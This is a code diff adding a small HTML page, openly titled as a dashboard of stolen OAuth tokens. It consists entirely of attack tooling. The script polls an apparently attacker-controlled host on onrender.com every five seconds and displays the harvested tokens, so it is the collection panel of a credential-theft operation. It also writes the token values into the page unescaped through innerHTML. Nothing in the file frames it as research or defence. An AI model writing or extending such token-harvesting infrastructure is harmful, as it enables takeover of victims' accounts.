@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>OAuth Token Dashboard</title>
+</head>
+<body>
+    <h1>Stolen OAuth Tokens</h1>
+    <ul id="token-list"></ul>
+
+    <script>
+        async function fetchTokens() {
+            let response = await fetch("https://malicious-app.onrender.com/stolen_tokens");
+            let tokens = await response.json();
+            let list = document.getElementById("token-list");
+
+            list.innerHTML = "";
+            tokens.forEach(token => {
+                list.innerHTML += `<li>${token}</li>`;
+            });
+        }
+
+        setInterval(fetchTokens, 5000);
+    </script>
+</body>
+</html>
